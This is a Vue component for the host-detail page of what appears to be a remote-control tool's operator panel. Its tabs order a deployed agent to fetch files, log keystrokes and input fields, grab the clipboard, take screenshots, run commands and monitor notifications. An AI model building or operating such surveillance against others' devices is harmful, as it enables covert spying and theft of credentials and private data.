<template>
  <div>
    <a-modal title="下载 Agent"
             :footer="null"
             :visible="isDownloadAgentVisible"
             @cancel="isDownloadAgentVisible = false">
      <DownloadAgent :id="id" :os="host.os"/>
    </a-modal>
    <template v-if="!isNotFound">
      <a-page-header class="host-header"
                     :title="isLoading ? '加载中...' : '主机：' + host.name"
                     :sub-title="$route.params.id"
                     @back="() => $router.go(-1)">
        <template slot="extra" v-if="!isLoading">
          <a-button key="1" type="primary" @click="isDownloadAgentVisible = true">
            下载 Agent
          </a-button>
          <a-button key="2" type="danger" :disabled="isDeleting" @click="deleteHost">
            删除
          </a-button>
        </template>
        <a-skeleton active v-if="isLoading" />
        <a-descriptions size="small" :column="2" v-else>
          <a-descriptions-item label="创建时间">
            {{ new Date(host.created_at).toLocaleString() }}
          </a-descriptions-item>
          <a-descriptions-item label="上一次活跃时间">
            <template v-if="host.last_seen === '0001-01-01T00:00:00Z'">从未连接</template>
            <template v-else>{{ new Date(host.last_seen).toLocaleString() }}</template>
          </a-descriptions-item>
          <a-descriptions-item label="地址">
            {{ host.addr }}
          </a-descriptions-item>
          <a-descriptions-item label="操作系统">
            <span v-if="host.os === 0">Windows</span>
            <span v-else>Android</span>
          </a-descriptions-item>
          <a-descriptions-item label="状态">
            <a-tag color="green" v-if="host.status"><a-icon type="link" />已连接</a-tag>
            <a-tag color="red" v-else><a-icon type="disconnect" />未连接</a-tag>
          </a-descriptions-item>
        </a-descriptions>
      </a-page-header>
      <a-row type="flex" justify="space-between" style="margin-top: 10px" v-if="!isLoading">
        <a-col :md="15" :xs="24" style="margin-bottom: 10px">
          <a-card
            title="控制"
            :tab-list="controlTabList"
            :active-tab-key="activeTabKey" @tabChange="key => activeTabKey = key">
            <template v-if="host.status">
              <template v-if="activeTabKey === 'file'">
                <a-row class="control-field">
                  <a-input-search placeholder="文件路径" size="large" v-model="pathInput" @search="execute($const.cmd.getFileContent, { path: pathInput })">
                    <a-button slot="enterButton" type="primary">
                      下载文件
                    </a-button>
                  </a-input-search>
                </a-row>
              </template>
              <template v-else-if="activeTabKey === 'keyboard'">
                <a-row class="control-field">
                  <a-button type="primary" size="large" style="width: 100%" @click="execute($const.cmd.listenKeyboard)">开启实时显示</a-button>
                </a-row>
                <a-row class="control-field" style="text-align: center">Windows为键盘监听，Android为输入框监听</a-row>
              </template>
              <template v-else-if="activeTabKey === 'clipboard'">
                <a-row class="control-field">
                  <a-button type="primary" size="large" style="width: 100%" @click="execute($const.cmd.getClipboard)">获取剪贴板</a-button>
                </a-row>
              </template>
              <template v-else-if="activeTabKey === 'screen'">
                <a-row class="control-field">
                  <a-button type="primary" size="large" style="width: 100%" @click="execute($const.cmd.getScreenshot)">获取当前截屏</a-button>
                </a-row>
              </template>
              <template v-else-if="activeTabKey === 'command'">
                <a-row class="control-field">
                  <a-input-search placeholder="命令" size="large" v-model="commandInput" :disabled="host.os === 1" @search="execute($const.cmd.execCommand, { command: commandInput })">
                    <a-button slot="enterButton"
                              type="primary"
                              :disabled="host.os === 1">
                      执行命令
                    </a-button>
                  </a-input-search>
                </a-row>
                <a-row class="control-field">
                  <a-button type="primary" size="large" style="width: 100%" @click="execute($const.cmd.getProcessList)">查看进程列表</a-button>
                </a-row>
              </template>
              <template v-else-if="activeTabKey === 'notification'">
                <a-row class="control-field">
                  <a-row class="control-field">
                    <a-button type="primary" size="large" style="width: 100%" :disabled="host.os === 0">开始监听通知</a-button>
                  </a-row>
                </a-row>
              </template>
            </template>
            <a-result title="请等待连接后进行操作" v-else/>
          </a-card>
        </a-col>
        <a-col :md="8" :xs="24">
          <a-card title="连接状态" :bodyStyle="{ padding: '0 5px' }">
            <a-table :data-source="connections" :show-header="false" row-key="addr" :loading="isConnectionLoading">
              <a-table-column key="addr" title="地址" data-index="addr"/>
              <a-table-column key="type" title="类型" data-index="type">
                <template slot-scope="type, record">
                  <span v-if="type === 0">控制连接</span>
                  <span v-else>传输连接</span>
                </template>
              </a-table-column>
            </a-table>
          </a-card>
        </a-col>
      </a-row>
    </template>
    <a-result status="404" title="未找到主机" v-else>
      <template #extra>
        <a-button type="primary" @click="$router.go(-1)">
          返回
        </a-button>
      </template>
    </a-result>
  </div>
</template>

<script>
import api from '../api'
import DownloadAgent from './DownloadAgent'
export default {
  name: 'HostDetail',
  components: { DownloadAgent },
  data () {
    return {
      isLoading: true,
      isNotFound: false,
      isDeleting: false,
      isConnectionLoading: true,
      isDownloadAgentVisible: false,
      isWaitingForTaskCreating: false,
      host: {},
      connections: [],
      controlTabList: [
        {
          key: 'file',
          tab: '文件'
        },
        {
          key: 'keyboard',
          tab: '键盘/输入框'
        },
        {
          key: 'clipboard',
          tab: '剪贴板'
        },
        {
          key: 'screen',
          tab: '屏幕'
        },
        {
          key: 'command',
          tab: '命令/进程'
        },
        {
          key: 'notification',
          tab: '通知'
        }
      ],
      activeTabKey: 'file',
      commandInput: '',
      pathInput: ''
    }
  },
  methods: {
    load () {
      this.isLoading = true
      this.isNotFound = false
      api.host.getDetail(this.id)
        .then(res => {
          this.activeTabKey = 'file'
          this.host = res.data.host
          this.loadConnection()
        })
        .catch(err => {
          if (err.response.status === 404) {
            this.isNotFound = true
            this.$message.error(`未找到主机 ${this.id}`)
          } else {
            this.$message.error(`获取主机 ${this.id} 详情失败`)
          }
        })
        .finally(() => {
          this.isLoading = false
        })
    },
    loadConnection () {
      this.isConnectionLoading = true
      api.connection.getList(this.id)
        .then(res => {
          this.connections = res.data.connections
        })
        .catch(() => {
          this.$message.error(`获取连接状态失败`)
        })
        .finally(() => {
          this.isConnectionLoading = false
        })
    },
    deleteHost () {
      this.isDeleting = true
      api.host.delete(this.id)
        .then(() => {
          this.$message.success(`成功删除主机 ${this.id}`)
          this.$router.push({ name: 'hostList' })
        })
        .catch(() => {
          this.$message.error(`删除主机 ${this.id} 失败`)
        })
        .finally(() => {
          this.isDeleting = false
        })
    },
    execute (cmd, params) {
      console.log(cmd)
      this.isWaitingForTaskCreating = true
      api.task.create({ os: this.host.os, id: this.host.id, cmd, params })
        .then((res) => {
          this.$message.success(`任务 ${res.data.id} 创建成功`)
          this.$router.push({ name: 'taskDetail', params: { hostId: this.host.id, taskId: res.data.id } })
        })
        .catch(() => {
          this.$message.error('尝试执行任务失败')
        })
        .finally(() => {
          this.isWaitingForTaskCreating = false
        })
    }
  },
  computed: {
    id () {
      return this.$route.params.id
    }
  },
  watch: {
    id () {
      this.load()
    }
  },
  mounted () {
    this.load()
  }
}
</script>

<style scoped>
.host-header {
  border: 1px solid rgb(235, 237, 240);
  background-color: #ffffff;
}
.control-field:not(:first-child) {
  margin-top: 10px;
}
</style>
